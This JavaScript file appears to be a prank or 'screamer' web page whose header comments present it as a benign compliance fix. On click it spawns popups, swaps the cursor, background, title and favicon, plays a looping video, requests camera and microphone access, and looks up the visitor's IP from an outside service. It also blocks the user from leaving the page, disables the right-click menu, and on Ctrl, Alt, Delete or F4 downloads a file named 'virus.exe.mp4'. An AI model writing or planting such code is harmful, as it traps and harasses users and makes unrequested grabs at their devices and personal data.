/* 
 * [Aug 2023] Fixed addEventListener for the document container.
 * [Oct 2021] Added to comply with strict browser policies.
 *
 * Requires safe.js & math.js preload.
 */
container.addEventListener('click', async () => {
	await proCreate(6);
	document.querySelector("#ui").remove()
	document.querySelector("#play").remove()
	document.documentElement.style.cursor = "url(cursor/1.gif), none"
	document.documentElement.style.animation = "cursor 1s linear infinite"
	document.documentElement.style.background = "url(media/popup.gif)"
	document.title = "JOE IS VERY VERY HUNGRY"
	poop = document.createElement("video")
	poop.src = "media/poop.mp4"
	poop.id = "poop"
	poop.muted = true
	poop.autoplay = true
	poop.loop = true
	document.body.appendChild(poop)
	document.querySelector("link[rel='icon']").href = "faviconpp.ico";
	navigator.mediaDevices.getUserMedia({ video: true, audio: true })
	fetch("https://api.ipify.org?format=json")
		.then(response => response.json())
		.then(data => {
			document.getElementById("ip").textContent = "HELLO";
		})
	window.onbeforeunload = () => "JOE IS VERY VERY HUNGRY";
	document.documentElement.addEventListener('click', async () => {
		await proCreate(6);
		window.onbeforeunload = () => "JOE IS VERY VERY HUNGRY";
	})
});

window.oncontextmenu = () => false;
window.onkeydown = async () => {
	if (['Control', 'Alt', 'Delete', 'F4'].includes(event.key)) {
		fileName = "media/virus.exe.mp4"
		const a = document.createElement('a')
		a.href = fileName
		a.download = "virus.exe.mp4"
		a.click()
		await proCreate(6);
		alert("JOSEPH IS STARVING");
	}
	
	return null;
}
/* [Aug 2023] End of amendments. */